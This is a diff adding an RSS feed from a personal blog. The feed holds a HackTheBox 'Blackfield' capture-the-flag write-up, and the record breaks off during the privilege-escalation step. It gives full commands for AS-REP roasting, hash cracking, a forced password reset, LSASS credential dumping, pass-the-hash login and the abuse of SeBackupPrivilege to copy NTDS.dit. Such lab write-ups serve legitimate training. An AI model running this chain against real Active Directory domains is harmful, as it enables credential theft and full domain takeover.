@@ -1,0 +1,919 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
+  <channel>
+    <title>ASREP-roasting on Ef&#39;s log</title>
+    <link>https://fahmifj.github.io/tags/asrep-roasting/</link>
+    <description>Recent content in ASREP-roasting on Ef&#39;s log</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <lastBuildDate>Tue, 04 May 2021 14:28:21 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/asrep-roasting/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>HackTheBox - Blackfield</title>
+      <link>https://fahmifj.github.io/writeups/hackthebox/htb-blackfield/</link>
+      <pubDate>Tue, 04 May 2021 14:28:21 +0700</pubDate>
+      
+      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-blackfield/</guid>
+      <description>Blackfield is a hard difficulty Windows machine from HackTheBox that features Active Directory environment. It begins with collecting a list of usernames from an SMB share. With these usernames, I&amp;rsquo;m able to perform AS-REP roasting attack and obtain a TGT from a helpdesk account. The helpdesk account can be used to reset the password of an audit account. Re-enumerating SMB shares using the audit account finds an LSASS memory dump file.</description>
+      <content:encoded><![CDATA[<p>Blackfield is a hard difficulty Windows machine  from HackTheBox that features Active Directory environment. It begins with collecting a list of usernames from an SMB share. With these usernames, I&rsquo;m able to perform AS-REP roasting attack and obtain a TGT from a helpdesk account. The helpdesk account can be used to reset the password of an audit account. Re-enumerating SMB shares using the audit account finds an LSASS memory dump file. The dump file contains an NT hash of a service account that is a member of Backup Operators. The privileges of the Backup Operators group can be abused to create a volume shadow copy and pull the <code>NTDS.dit</code> file from there. With the <code>NTDS.dit</code> file, I&rsquo;m able to retrieves the NT hash of the administrator account, and then perform pass-the-hash attack to gain administrator access.</p>
+<h3 id="skills-learned">Skills Learned</h3>
+<ul>
+<li>AS-REP roasting</li>
+<li>LDAP enumeration</li>
+<li>BloodHound</li>
+<li>Abusing Windows Access Tokens - SeBackupPrivilege</li>
+</ul>
+<h3 id="tools">Tools</h3>
+<ul>
+<li>Kali Linux 2019.4 (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
+<li>Nmap - Preinstalled in Kali Linux</li>
+<li>smbclient - Preinstalled in Kali Linux</li>
+<li>SMBMap - Preinstalled in Kali Linux</li>
+<li>ldapdomaindump - <a href="https://github.com/dirkjanm/ldapdomaindump">https://github.com/dirkjanm/ldapdomaindump</a></li>
+<li>CrackMapExec - <a href="https://github.com/byt3bl33d3r/CrackMapExec">https://github.com/byt3bl33d3r/CrackMapExec</a></li>
+<li>BloodHound - <a href="https://github.com/BloodHoundAD/BloodHound">https://github.com/BloodHoundAD/BloodHound</a></li>
+<li>BloodHound.py - <a href="https://github.com/fox-it/BloodHound.py">https://github.com/fox-it/BloodHound.py</a></li>
+<li>SeBackupPrivilege CmdLets - <a href="https://github.com/giuliano108/SeBackupPrivilege">https://github.com/giuliano108/SeBackupPrivilege</a></li>
+</ul>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="nmap">Nmap</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «blackfield» «10.10.14.169»
+$ nmap -sC -sV -oN initial-blackfield 10.10.10.192
+Nmap scan report <span style="color:#66d9ef">for</span> blackfield.htb <span style="color:#f92672">(</span>10.10.10.192<span style="color:#f92672">)</span>
+Host is up <span style="color:#f92672">(</span>0.054s latency<span style="color:#f92672">)</span>.
+
+PORT STATE SERVICE VERSION
+53/tcp open domain?
+| fingerprint-strings: 
+| DNSVersionBindReqTCP: 
+| version
+|_ bind
+88/tcp open kerberos-sec Microsoft Windows Kerberos <span style="color:#f92672">(</span>server time: 2020–10–04 10:53:38Z<span style="color:#f92672">)</span>
+135/tcp open msrpc Microsoft Windows RPC
+389/tcp open ldap Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: BLACKFIELD.local0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+445/tcp open microsoft-ds?
+593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
+3268/tcp open ldap Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: BLACKFIELD.local0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+<span style="color:#ae81ff">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port53-TCP:V<span style="color:#f92672">=</span>7.80%I<span style="color:#f92672">=</span>7%D<span style="color:#f92672">=</span>10/3%Time<span style="color:#f92672">=</span>5F794746%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu%r<span style="color:#f92672">(</span>DNSV
+SF:ersionBindReqTCP,20,<span style="color:#e6db74">&#34;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
+</span><span style="color:#e6db74">SF:x04bind\0\0\x10\0\x03&#34;</span><span style="color:#f92672">)</span>;
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+Host script results:
+|_clock-skew: 6h59m59s
+| smb2-security-mode: 
+| 2.02: 
+|_ Message signing enabled and required
+| smb2-time: 
+| date: 2020–10–04T10:55:58
+|_ start_date: N/A
+</code></pre></div><p>An initial TCP scan with <code>nmap</code> discovered at least seven open ports. These ports are the typical port used by Active Directory Domain Controller (AD DC).</p>
+<p>I&rsquo;ll summarize the result:</p>
+<ul>
+<li>There is a DNS service on port 53, but HTB box is a single machine, so enumerating this service is not priority.</li>
+<li>There is a Kerberos service on port 88 is running Kerberos. I can try AS-REP roasting here.</li>
+<li>There is MS-RPC service on port 135, which I don&rsquo;t touch it really often, so I&rsquo;ll lower the priority.</li>
+<li>There is an LDAP service on port 389, LDAP is the standard protocol for directory services. Active Directory is Microsoft&rsquo;s implementation of directory services and it supports LDAP query.</li>
+<li>There is an SMB service on port 445. I can try anonymous login here.</li>
+<li>Port 3268 is running LDAP as well, but it&rsquo;s used as <a href="https://social.technet.microsoft.com/Forums/Lync/en-US/e52b9154-b93a-4a3b-b6f2-0285f932da14/389-and-3268-port-difference?forum=winserverDS">global catalog</a> (read more: <a href="https://www.techopedia.com/definition/25429/global-catalog-gc">here</a>).</li>
+</ul>
+<p><code>nmap</code> also identified the AD domain name is <code>blackfield.local</code>.</p>
+<h2 id="enumeration">Enumeration</h2>
+<h3 id="tcp-389---ldap">TCP 389 - LDAP</h3>
+<p>On LDAP, I can send a query to obtain the domain metadata, but first I&rsquo;ll look into the rootDSE<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup> to retrieve a list of the domain naming context.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «blackfield» «10.10.14.169»
+$ ldapsearch -LLL -x -h 10.10.10.192 -s base namingContexts
+dn:
+namingcontexts: DC<span style="color:#f92672">=</span>BLACKFIELD,DC<span style="color:#f92672">=</span>local
+namingcontexts: CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span>BLACKFIELD,DC<span style="color:#f92672">=</span>local
+namingcontexts: CN<span style="color:#f92672">=</span>Schema,CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span>BLACKFIELD,DC<span style="color:#f92672">=</span>local
+namingcontexts: DC<span style="color:#f92672">=</span>DomainDnsZones,DC<span style="color:#f92672">=</span>BLACKFIELD,DC<span style="color:#f92672">=</span>local
+namingcontexts: DC<span style="color:#f92672">=</span>ForestDnsZones,DC<span style="color:#f92672">=</span>BLACKFIELD,DC<span style="color:#f92672">=</span>local
+</code></pre></div><ul>
+<li>
+<p><code>-LLL</code>: removes every comments in the output</p>
+</li>
+<li>
+<p><code>-x</code>: to perform simple authentication</p>
+</li>
+<li>
+<p><code>-h</code>: hostname or IP</p>
+</li>
+<li>
+<p><code>-s</code>: search scope, base will returns the contents of the root DSE</p>
+</li>
+</ul>
+<p>I can use <code>DC=BLACKFIELD,DC=local</code> (this is called as <em>distinguished name</em>), but unfortunately the anonymous bind is not allowed.</p>
+<h3 id="tcp-445---smb">TCP 445 - SMB</h3>
+<p>Trying anonymous login with <code>crackmapexec</code> returns a status access denied.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «blackfield» «10.10.14.169»
+$ crackmapexec smb 10.10.10.192 -u <span style="color:#e6db74">&#39;&#39;</span> -p <span style="color:#e6db74">&#39;&#39;</span> --shares
+SMB         10.10.10.192    <span style="color:#ae81ff">445</span>    DC01             <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows 10.0 Build <span style="color:#ae81ff">17763</span> <span style="color:#f92672">(</span>name:DC01<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:BLACKFIELD.local<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>
+SMB         10.10.10.192    <span style="color:#ae81ff">445</span>    DC01             <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> BLACKFIELD.local<span style="color:#ae81ff">\:</span> STATUS_ACCESS_DENIED
+SMB         10.10.10.192    <span style="color:#ae81ff">445</span>    DC01             <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Error enumerating shares: STATUS_ACCESS_DENIED
+</code></pre></div><p>But on using <code>smbclient</code>, it return the shares list.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «blackfield» «10.10.14.169»
+$ smbclient -N -L //10.10.10.192/
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        forensic        Disk      Forensic / Audit share.
+        IPC$            IPC       Remote IPC
+        NETLOGON        Disk      Logon server share
+        profiles$       Disk
+        SYSVOL          Disk      Logon server share
+Reconnecting with SMB1 <span style="color:#66d9ef">for</span> workgroup listing.
+do_connect: Connection <span style="color:#66d9ef">for</span> 10.10.10.192 failed <span style="color:#f92672">(</span>Error NT_STATUS_IO_TIMEOUT<span style="color:#f92672">)</span>
+Unable to connect with SMB1 -- no workgroup available
+</code></pre></div><p>Later, I came to know that ‘anonymous’ must be specified in <code>crackmapexec</code>.</p>
+<p><div class="img-container"><img src="imgs/image-20210504155151284.png" alt="image-20210504155151284"  /></div>
+</p>
+<h4 id="profiles-share">profiles$ share</h4>
+<p>I have read permission on the <code>profile$</code> share. The share contains a bunch of empty users folder.</p>
+<p><div class="img-container"><img src="imgs/image-20210504155638689.png" alt="image-20210504155638689"  /></div>
+</p>
+<p>I can convert these folders name to list of username using <code>awk '{print $1}'</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «blackfield» «10.10.14.169»
+$ cat folder.list | awk <span style="color:#e6db74">&#39;{print $1}&#39;</span> | tee users.list
+AAlleni
+ABarteski
+ABekesz
+ABenzies
+ABiemiller
+AChampken
+...&lt;SNIP&gt;...
+</code></pre></div><p>Now that I have a list of usernames, I can try AS-REP roast attack.</p>
+<h3 id="tcp-88---kerberos">TCP 88 - Kerberos</h3>
+<h4 id="as-rep-roasting">AS-REP roasting</h4>
+<p>I&rsquo;ll use <code>GetNPUsers.py</code> to perform AS-REP roasting on Kerberos.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «blackfield» «10.10.14.169»
+$ GetNPUsers.py BLACKFIELD.LOCAL/ -no-pass -usersfile users.list -dc-ip 10.10.10.192 -outputfile TGT_AS-REP
+</code></pre></div><p>And watching the output file using watch command</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «blackfield» «10.10.14.169»
+$ watch -n <span style="color:#ae81ff">1</span> cat TGT_AS-REP
+</code></pre></div><p>After a few minutes, it shows the hash for user <code>support</code>.</p>
+<p><div class="img-container"><img src="imgs/image-20210504160338371.png" alt="image-20210504160338371"  /></div>
+</p>
+<p>I&rsquo;ll send the hash to my Windows for cracking.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «blackfield» «10.10.14.169»
+$ cat TGT_AS-REP
+$krb5asrep$23$support@BLACKFIELD.LOCAL:55211d2eb15e1539552de705eb8605c4$821c479c296fc01c7db5c01f75c08cedd607897692d622f1de2972d6601ebd880b3cb32e663e8c1a2cac5f2531aa1f1cb1323bc6b2a1816d212f179031952b9c1c1290cf11066339706d5cc592ab1e4e9de40e4db0986647c550860b2677671ce6b4b73761e119f56d9651b277a1297a87fa160e22eed4ecee7cb522c03d142cac647a467dfc48f69afb17fef110337134cfef9070f0b1f34d073772409dc31c6c0d0edea5562a9a37387ea44a48fb4947277e84300db0bf7da4ec5a9b3be94a7a1d4c910b1dd39f17ace62366f8e111dca756e13359750171464cd23b23e7b33d427a42978b489dc0a58bc9e586ff02ff3ab805
+</code></pre></div><h3 id="cracking-the-hash">Cracking the Hash</h3>
+<p>I&rsquo;ll use dictionary attack to recover the user password using <code>hashcat</code>, and it cracks within a few seconds.</p>
+<pre><code>C:\tools\hashcat6&gt; hashcat -m 18200 hashes/blackfield.hash rockyou.txt -O
+hashcat (v6.1.1) starting...
+
+...&lt;SNIP&gt;...
+$krb5asrep$23$support@BLACKFIELD.LOCAL:55211d2eb15e1539552de705eb8605c4$821c479c296fc01c7db5c01f75c08cedd607897692d622f1de2972d6601ebd880b3cb32e663e8c1a2cac5f2531aa1f1cb1323bc6b2a1816d212f179031952b9c1c1290cf11066339706d5cc592ab1e4e9de40e4db0986647c550860b2677671ce6b4b73761e119f56d9651b277a1297a87fa160e22eed4ecee7cb522c03d142cac647a467dfc48f69afb17fef110337134cfef9070f0b1f34d073772409dc31c6c0d0edea5562a9a37387ea44a48fb4947277e84300db0bf7da4ec5a9b3be94a7a1d4c910b1dd39f17ace62366f8e111dca756e13359750171464cd23b23e7b33d427a42978b489dc0a58bc9e586ff02ff3ab805:#00^BlackKnight
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Name........: Kerberos 5, etype 23, AS-REP
+Hash.Target......: $krb5asrep$23$support@BLACKFIELD.LOCAL:55211d2eb15e...3ab805
+...&lt;SNIP&gt;...
+</code></pre><p>The password for user <code>support</code> is <code>#00^BlackKnight</code>.</p>
+<h3 id="access-as-support">Access as support</h3>
+<p>Now that I obtained a set of credentials, I can re-enumerate the available services.</p>
+<h4 id="ldap-domain-dump">LDAP Domain Dump</h4>
+<p>The credentials works on LDAP, I can use it to obtain the domain info using <a href="https://github.com/dirkjanm/ldapdomaindump">ldapdomaindump</a>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «loot» «10.10.14.169»
+$ ldapdomaindump -u <span style="color:#e6db74">&#39;BLACKFIELD.LOCAL\support&#39;</span> -p <span style="color:#e6db74">&#39;#00^BlackKnight&#39;</span> -no-json -no-grep 10.10.10.192
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Connecting to host...
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Binding to host
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Bind OK
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Starting domain dump
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Domain dump finished
+</code></pre></div><p>The output from the tool are formatted in HTML document, and I get the following information:</p>
+<p>The OS information and the computer FQDN.</p>
+<p><div class="img-container"><img src="imgs/image-20210504162822528.png" alt="image-20210504162822528"  /></div>
+</p>
+<p>The domain policy.</p>
+<p><div class="img-container"><img src="imgs/image-20210504162931229.png" alt="image-20210504162931229"  /></div>
+</p>
+<p>The interesting domain users.</p>
+<p><div class="img-container"><img src="imgs/image-20210504163338913.png" alt="image-20210504163338913"  /></div>
+</p>
+<p><div class="img-container"><img src="imgs/image-20210504163255290.png" alt="image-20210504163255290"  /></div>
+</p>
+<p>Interesting groups</p>
+<p><div class="img-container"><img src="imgs/image-20210504163741235.png" alt="image-20210504163741235"  /></div>
+</p>
+<p><div class="img-container"><img src="imgs/image-20210504163658173.png" alt="image-20210504163658173"  /></div>
+</p>
+<p><div class="img-container"><img src="imgs/image-20210504163716719.png" alt="image-20210504163716719"  /></div>
+</p>
+<p>From here, I know that user <code>support</code> does not have remote shell access like WinRM.</p>
+<h4 id="bloodhound">BloodHound</h4>
+<p>There is a python-based ingestor for <code>BloodHound</code> besides <code>SharpHound</code>. It can be used remotely from Linux.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «loot» «10.10.14.169»
+$ python bloodhound.py -c All -u <span style="color:#e6db74">&#39;support@blackfield.local&#39;</span> -p <span style="color:#e6db74">&#39;#00^BlackKnight&#39;</span> -d blackfield.local -dc DC01.BLACKFIELD.local -ns 10.10.10.192
+</code></pre></div><ul>
+<li><code>-c</code>: collect method : all</li>
+<li><code>-u</code>,<code>-p</code>: credentials set</li>
+<li><code>-d</code>: domain name</li>
+<li><code>-dc</code>: FQDN of domain controller (it’s on ldap domain dump section → <strong>domain_computers.html</strong>)</li>
+<li><code>-ns</code>: name server / DNS</li>
+</ul>
+<p>It returns the following output:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">INFO: Found AD domain: blackfield.local
+INFO: Connecting to LDAP server: DC01.BLACKFIELD.local
+INFO: Found <span style="color:#ae81ff">1</span> domains
+INFO: Found <span style="color:#ae81ff">1</span> domains in the forest
+INFO: Found <span style="color:#ae81ff">18</span> computers
+INFO: Connecting to LDAP server: dc01.blackfield.local
+INFO: Found <span style="color:#ae81ff">316</span> users
+INFO: Connecting to GC LDAP server: dc01.blackfield.local
+INFO: Found <span style="color:#ae81ff">51</span> groups
+INFO: Found <span style="color:#ae81ff">0</span> trusts
+INFO: Starting computer enumeration with <span style="color:#ae81ff">10</span> workers
+INFO: Querying computer: DC01.BLACKFIELD.local
+INFO: Done in 00M 18S
+</code></pre></div><p>The output files from the tool are in json format. They are: <code>computers.json</code>, <code>domains.json</code>, <code>groups.json</code> and <code>users.json</code>.</p>
+<p>I can upload these files to <code>BloodHound</code> GUI by drag and drop.</p>
+<p><div class="img-container"><img src="imgs/image-20210504165340110.png" alt="image-20210504165340110"  /></div>
+</p>
+<p>Enumerating the user <code>support</code> permissions discovers it has <code>ForceChangePassword</code> permission on Audit2020. That means user <code>support</code> is able to change the user <code>audit2020</code> password.</p>
+<p><div class="img-container"><img src="imgs/image-20210504165510700.png" alt="image-20210504165510700"  /></div>
+</p>
+<h4 id="reset-audit2020-password">Reset Audit2020 Password</h4>
+<p>I can change the user <code>audit2020</code> password using <code>net rpc</code><sup id="fnref:2"><a href="#fn:2" class="footnote-ref" role="doc-noteref">2</a></sup>. I&rsquo;ll set <code>P@$$w0rd!</code> as the new password for user <code>audit2020</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «blackfield» «10.10.14.169»
+$ net rpc password audit2020 -U <span style="color:#e6db74">&#39;support%#00^BlackKnight&#39;</span> -S 10.10.10.192
+Enter new password <span style="color:#66d9ef">for</span> audit2020: 
+</code></pre></div><h3 id="access-as-audit2020">Access as Audit2020</h3>
+<h4 id="forensic-share">forensic share</h4>
+<p>With <code>audit2020</code>, I can access the forensic share.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «blackfield» «10.10.14.169»
+$ smbmap -H 10.10.10.192 -u audit2020 -p <span style="color:#e6db74">&#39;P@$$w0rd!&#39;</span> 
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> IP: 10.10.10.192:445        Name: BLACKFIELD.local
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        ADMIN$                                                  NO ACCESS       Remote Admin
+        C$                                                      NO ACCESS       Default share
+        forensic                                                READ ONLY       Forensic / Audit share.
+        IPC$                                                    READ ONLY       Remote IPC
+        NETLOGON                                                READ ONLY       Logon server share
+        profiles$                                               READ ONLY
+        SYSVOL                                                  READ ONLY       Logon server share
+</code></pre></div><p>Inside the share, there is three folders, and I&rsquo;ll download all of them to my Kali.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «blackfield» «10.10.14.169»
+$ smbclient -U <span style="color:#e6db74">&#39;audit2020%P@$$w0rd!&#39;</span>//10.10.10.192/forensic 
+Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
+smb: <span style="color:#ae81ff">\&gt;</span> ls
+  .                                   D        <span style="color:#ae81ff">0</span>  Sun Feb <span style="color:#ae81ff">23</span> 20:03:16 <span style="color:#ae81ff">2020</span>
+  ..                                  D        <span style="color:#ae81ff">0</span>  Sun Feb <span style="color:#ae81ff">23</span> 20:03:16 <span style="color:#ae81ff">2020</span>
+  commands_output                     D        <span style="color:#ae81ff">0</span>  Mon Feb <span style="color:#ae81ff">24</span> 01:14:37 <span style="color:#ae81ff">2020</span>
+  memory_analysis                     D        <span style="color:#ae81ff">0</span>  Fri May <span style="color:#ae81ff">29</span> 03:28:33 <span style="color:#ae81ff">2020</span>
+  tools                               D        <span style="color:#ae81ff">0</span>  Sun Feb <span style="color:#ae81ff">23</span> 20:39:08 <span style="color:#ae81ff">2020</span>
+smb: <span style="color:#ae81ff">\&gt;</span> recurse on
+smb: <span style="color:#ae81ff">\&gt;</span> mget *
+</code></pre></div><p>Enumerating on the memory_analysis folder, there is a file called <code>lsass.zip</code> that contains <code>lsass.DMP</code> which is interesting to me.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «blackfield» «10.10.14.169»
+$ file lsass.DMP
+lsass.DMP: Mini DuMP crash report, <span style="color:#ae81ff">16</span> streams, Sun Feb <span style="color:#ae81ff">23</span> 18:02:01 2020, 0x421826 type
+</code></pre></div><blockquote>
+<p>LSASS (Local Security Authentication Subsystem Service) is a service/process that used to verify and authenticate users on login to a Windows computer. In other words, it holds the Windows credentials.</p>
+</blockquote>
+<p>I can use a tool called <code>pypykatz</code> to dump the contents of <code>lsass.DMP</code>. The NT hash of <code>svc-backup</code> immediately shows up on the top.</p>
+<p><div class="img-container"><img src="imgs/image-20210504173356195.png" alt="image-20210504173356195"  /></div>
+</p>
+<p><code>svc_backup:9658d1d1dcd9250115e2205d9f48400d</code>.</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="shell-as-svc_backup">Shell as svc_backup</h3>
+<h4 id="remote-access">Remote Access</h4>
+<p>I already know that this user can login remotely (from <a href="#ldap-domain-dump">LDAP</a>), so I can try it with <code>evil-winrm</code>, and it works.</p>
+<pre><code>→ root@iamf «blackfield» «10.10.14.169»
+$ evil-winrm -i 10.10.10.192 -u svc_backup -H '9658d1d1dcd9250115e2205d9f48400d'
+</code></pre><p><div class="img-container"><img src="imgs/image-20210504173749952.png" alt="image-20210504173749952"  /></div>
+</p>
+<p>User flag is done here.</p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="shell-as-administrator">Shell as Administrator</h3>
+<h4 id="internal-enumeration">Internal Enumeration</h4>
+<p>Also from <a href="#ldap-domain-dump">LDAP</a>, <code>svc-backup</code> is a member of the Backup Operators group. Each member of the Backup Operators group can perform backup and restore operations. The privilege name to perform those two operations are called <code>SeBackupPrivilege</code> and <code>SeRestorePrivilege</code>.</p>
+<p><div class="img-container"><img src="imgs/image-20210504174334134.png" alt="image-20210504174334134"  /></div>
+</p>
+<p>Those two privileges can be abused<sup id="fnref:3"><a href="#fn:3" class="footnote-ref" role="doc-noteref">3</a></sup> using <code>diskshadow</code><sup id="fnref:4"><a href="#fn:4" class="footnote-ref" role="doc-noteref">4</a></sup>.</p>
+<p>I can&rsquo;t just perform the backup and restore if the system is currently in use. But, there is a technology from Microsoft called &ldquo;Shadow Copy&rdquo; that makes this possible, and that&rsquo;s where <code>diskshadow</code> will be used.</p>
+<p>So the idea is that I can create a volume shadow of <code>C:\</code> drive and backup the <code>NTDS.dit</code> file (AD database) from the volume shadow back to <code>C:\</code> drive. After that I can grab the <code>ntds.dit</code> and dump the NT hashes from <code>NTDS.dit</code> locally using <code>secretsdump.py</code>.</p>
+<h4 id="abusing-sebackupprivilege">Abusing SeBackupPrivilege</h4>
+<p>To abuse this privilege, I&rsquo;ll use <a href="https://gist.githubusercontent.com/bohops/d34d9cf7793ba5f98009bc4ab2acd8f9/raw/38706044fb62790db16b0af21b7028a59591c05f/diskshadow.txt">this gist</a> as reference, and I&rsquo;ll need <a href="https://github.com/giuliano108/SeBackupPrivilege">this module</a>.</p>
+<p>Then, I&rsquo;ll create a few scripts to perform all the needed actions (create a volume, grab <code>ntds.dit</code>, and cleanup the volume shadow) in one shot.</p>
+<p>First, the script for grabbing <code>ntds.dit</code>, I&rsquo;ll save it as <code>copy.cmd</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">cmd.exe /c &#34;powershell.exe -c Import-Module(Resolve-Path(&#39;SeBackupPrivilegeCmdLets.dll&#39;)); Import-Module(Resolve-Path(&#39;SeBackupPrivilegeCmdLets.dll&#39;)); Copy-FileSeBackupPrivilege f:\windows\ntds\ntds.dit C:\temp\ntds.dit&#34;
+</code></pre></div><p>Second, the script for creating and deleting the volume shadow, I&rsquo;ll save it as <code>script.txt</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">set context persistent nowriters 
+add volume c: alias iamf 
+create 
+expose %iamf% f: 
+exec &#34;copy.cmd&#34; 
+delete shadows volume %iamf% 
+reset
+</code></pre></div><p>I&rsquo;ll move the modules and the scripts to a folder called <code>exploits</code>.</p>
+<pre><code>→ root@iamf «exploits» «10.10.14.169»
+$ tree
+.
+├── SeBackupPrivilegeCmdLets.dll
+├── SeBackupPrivilegeUtils.dll
+├── copy.cmd
+└── script.txt
+
+0 directories, 4 files
+</code></pre><p>Now, I’ll copy these <code>.dll</code> modules, <code>copy.cmd</code>, and <code>script.txt</code> to Blackfield using upload feature from <code>evil-winrm</code> at <code>C:\temp\</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «exploits» «10.10.14.169»
+$ evil-winrm -i 10.10.10.192 -u svc_backup -H <span style="color:#e6db74">&#39;9658d1d1dcd9250115e2205d9f48400d&#39;</span>
+Evil-WinRM shell v2.3
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\s</span>vc_backup<span style="color:#ae81ff">\D</span>ocuments&gt;mkdir C:<span style="color:#ae81ff">\t</span>emp; cd C:<span style="color:#ae81ff">\t</span>emp
+...&lt;SNIP&gt;...
+*Evil-WinRM* PS C:<span style="color:#ae81ff">\t</span>emp&gt; upload SeBackupPrivilegeCmdLets.dll
+...&lt;SNIP&gt;...
+*Evil-WinRM* PS C:<span style="color:#ae81ff">\t</span>emp&gt; upload SeBackupPrivilegeUtils.dll
+...&lt;SNIP&gt;...
+*Evil-WinRM* PS C:<span style="color:#ae81ff">\t</span>emp&gt; upload copy.cmd
+...&lt;SNIP&gt;...
+*Evil-WinRM* PS C:<span style="color:#ae81ff">\t</span>emp&gt; upload script.txt
+...&lt;SNIP&gt;...
+</code></pre></div><p>After that, I can run <code>diskshadow</code> with the <code>/s</code> option and specify <code>script.txt</code> as the command sequence.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">Evil-WinRM* PS C:\temp&gt; diskshadow /s script.txt
+Microsoft DiskShadow version 1.0
+Copyright (C) 2013 Microsoft Corporation
+On computer:  DC01,  10/4/2020 8:15:53 AM
+
+-&gt; set context persistent nowriters
+-&gt; add volume c: alias iamf
+-&gt; create
+
+Alias iamf for shadow ID {7c53326a-2617-450c-9d2d-5c381352aa45} set as environment variable.
+Alias VSS_SHADOW_SET for shadow set ID {6142125a-a889-46a9-9d5e-87ff17b66d2c} set as environment variable.
+
+Querying all shadow copies with the shadow copy set ID {6142125a-a889-46a9-9d5e-87ff17b66d2c}
+
